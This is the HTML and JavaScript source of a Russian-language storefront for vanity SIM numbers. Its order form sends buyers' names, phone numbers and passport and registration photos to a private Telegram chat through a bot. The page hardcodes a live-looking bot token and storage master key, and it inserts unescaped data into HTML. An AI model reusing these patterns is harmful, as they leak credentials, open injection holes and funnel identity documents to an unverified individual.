<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SIM MARKET | PREMIUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap');
        body { background: #000; color: #fff; font-family: 'Manrope', sans-serif; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(18, 18, 18, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); }
        .gold-bg { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); }
        .gold-text { background: linear-gradient(135deg, #fbbf24 0%, #d97706 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); border-radius: 28px; }
        .badge { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 4px 8px; font-size: 9px; font-weight: 800; text-transform: uppercase; color: #a1a1aa; }
        .price-tag { background: rgba(251, 191, 36, 0.1); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.2); border-radius: 12px; padding: 6px 12px; font-weight: 800; }
        .tab-btn { transition: 0.3s; white-space: nowrap; font-size: 11px; font-weight: 800; text-transform: uppercase; color: #71717a; border: 1px solid rgba(255,255,255,0.05); cursor: pointer; }
        .tab-active { background: #fff !important; color: #000 !important; border-color: #fff !important; }
        #order-modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.95); align-items: center; justify-content: center; padding: 20px; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="pb-20">

    <header class="p-6 sticky top-0 z-50 glass flex justify-between items-center">
        <div>
            <h1 class="text-2xl font-black uppercase italic">SIM <span class="gold-text">MARKET</span></h1>
            <div class="h-1 w-12 gold-bg rounded-full mt-1"></div>
        </div>
    </header>

    <main class="max-w-2xl mx-auto p-4">
        <input type="text" id="q" oninput="draw()" placeholder="Найти красивый номер..." class="w-full p-6 rounded-3xl bg-zinc-900/50 border border-zinc-800 outline-none text-base focus:border-amber-500 mb-8">

        <div class="flex gap-3 overflow-x-auto no-scrollbar mb-8 pb-2">
            <button onclick="setFilter('all', this)" class="tab-btn tab-active px-8 py-3 rounded-2xl bg-zinc-900">Все</button>
            <button onclick="setFilter('mts', this)" class="tab-btn px-8 py-3 rounded-2xl bg-zinc-900">МТС</button>
            <button onclick="setFilter('megafon', this)" class="tab-btn px-8 py-3 rounded-2xl bg-zinc-900">Мегафон</button>
            <button onclick="setFilter('beeline', this)" class="tab-btn px-8 py-3 rounded-2xl bg-zinc-900">Билайн</button>
            <button onclick="setFilter('tele2', this)" class="tab-btn px-8 py-3 rounded-2xl bg-zinc-900">Теле2</button>
            <button onclick="setFilter('yota', this)" class="tab-btn px-8 py-3 rounded-2xl bg-zinc-900">Yota</button>
        </div>

        <div id="list" class="space-y-5">
            <div class="text-center py-20 opacity-30 animate-pulse uppercase font-bold">Загрузка номеров...</div>
        </div>
    </main>

    <div id="order-modal">
        <div class="bg-zinc-950 w-full max-w-sm p-8 rounded-[3rem] border border-zinc-800 space-y-5 relative">
            <button onclick="closeModal()" class="absolute top-6 right-6 text-zinc-500">✕</button>
            <h2 id="target-num" class="text-3xl font-black text-center gold-text"></h2>
            <input type="text" id="client-fio" placeholder="ФИО полностью" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-2xl outline-none">
            <input type="tel" id="client-phone" placeholder="Ваш телефон" class="w-full p-4 bg-zinc-900 border border-zinc-800 rounded-2xl outline-none">
            
            <div class="grid grid-cols-2 gap-3 text-center">
                <div class="p-3 bg-zinc-900 border border-zinc-800 rounded-2xl">
                    <label class="block text-[7px] uppercase font-black mb-1 opacity-40 text-white">Паспорт</label>
                    <input type="file" id="client-passport" accept="image/*" class="hidden">
                    <button onclick="document.getElementById('client-passport').click()" class="text-[9px] font-bold text-amber-500 uppercase">Выбрать</button>
                </div>
                <div class="p-3 bg-zinc-900 border border-zinc-800 rounded-2xl">
                    <label class="block text-[7px] uppercase font-black mb-1 opacity-40 text-white">Прописка</label>
                    <input type="file" id="client-prodiska" accept="image/*" class="hidden">
                    <button onclick="document.getElementById('client-prodiska').click()" class="text-[9px] font-bold text-amber-500 uppercase">Выбрать</button>
                </div>
            </div>
            <button onclick="submitOrder()" id="send-btn" class="w-full py-5 gold-bg text-black font-black rounded-2xl uppercase text-xs">Подтвердить заказ</button>
        </div>
    </div>

    <script>
        const TOKEN = "8279695581:AAGuQgQhmgq9QaTX4rULywq6o18MeT3XIUw";
        const MY_ID = "8768514374"; 
        const BIN = "69c9d640aaba882197a65742"; 
        const KEY = "$2a$10$BIVZfOXmYVaG9NpPRW61Le//5yePRuieGl/ph3o6UYlHw4uOJQKtW"; 

        let db = [], activeFilter = 'all';

        async function init() {
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN}/latest`, {
                    headers: { 'X-Master-Key': KEY }
                });
                const data = await res.json();
                // Проверка структуры JSON
                db = data.record.record || data.record;
                if (!Array.isArray(db)) db = [];
                draw();
            } catch (e) {
                document.getElementById('list').innerHTML = '<div class="text-center py-20 text-red-500">Ошибка загрузки базы. Проверьте интернет.</div>';
            }
        }

        function setFilter(val, btn) {
            activeFilter = val.toLowerCase();
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
            btn.classList.add('tab-active');
            draw();
        }

        function draw() {
            const list = document.getElementById('list');
            const query = document.getElementById('q').value.toLowerCase();
            
            // Фильтрация
            let filtered = db.filter(item => {
                const numStr = String(item.n || "").toLowerCase();
                const opStr = String(item.op || "").toLowerCase();
                
                const matchSearch = numStr.includes(query);
                // Если "Все", то показываем всё. Если выбран оператор, сравниваем.
                const matchTab = (activeFilter === 'all') || (opStr === activeFilter);
                
                return matchSearch && matchTab;
            });

            if (filtered.length === 0) {
                list.innerHTML = '<div class="text-center py-20 opacity-30 uppercase text-xs font-bold">В этой категории пока нет номеров</div>';
                return;
            }

            list.innerHTML = filtered.map(item => `
                <div class="card p-7 shadow-xl">
                    <div class="flex justify-between items-start mb-4">
                        <div class="flex gap-2">
                            <span class="badge italic">${item.op || 'SIM'}</span>
                            <span class="badge text-amber-500">${item.tarif || 'VIP'}</span>
                        </div>
                        <div class="price-tag">${item.t || '0'} ₽</div>
                    </div>
                    <div class="flex justify-between items-end">
                        <div class="text-3xl font-black tracking-tighter text-white">${item.n}</div>
                        <button onclick="openModal('${item.n}', '${item.t}')" class="px-6 py-3 gold-bg text-black font-black rounded-xl text-[10px] uppercase active:scale-95 transition-all">Забрать</button>
                    </div>
                </div>
            `).reverse().join('');
        }

        function openModal(n, t) {
            document.getElementById('target-num').innerText = n;
            document.getElementById('order-modal').style.display = 'flex';
            window.currentN = n; window.currentT = t;
        }

        function closeModal() { document.getElementById('order-modal').style.display = 'none'; }

        async function submitOrder() {
            const fio = document.getElementById('client-fio').value;
            const phone = document.getElementById('client-phone').value;
            const passImg = document.getElementById('client-passport').files[0];
            const propImg = document.getElementById('client-prodiska').files[0];
            const btn = document.getElementById('send-btn');

            if(!fio || !phone || !passImg || !propImg) return alert("Пожалуйста, заполните все поля и выберите 2 фото");

            btn.innerText = "ОТПРАВКА..."; btn.disabled = true;

            try {
                const msg = `🚀 *ЗАКАЗ*\n📱 Номер: \`${window.currentN}\`\n💰 Цена: ${window.currentT} ₽\n👤 Клиент: ${fio}\n📞 Связь: ${phone}`;
                
                // Текст
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: MY_ID, text: msg, parse_mode: 'Markdown' })
                });

                // Фото 1
                const fd1 = new FormData(); fd1.append('chat_id', MY_ID); fd1.append('photo', passImg);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });

                // Фото 2
                const fd2 = new FormData(); fd2.append('chat_id', MY_ID); fd2.append('photo', propImg);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });

                alert("Заявка успешно отправлена Курбану!");
                closeModal();
            } catch (e) { alert("Ошибка отправки! Попробуйте позже."); } 
            finally { btn.innerText = "Подтвердить заказ"; btn.disabled = false; }
        }

        init();
    </script>
</body>
</html>
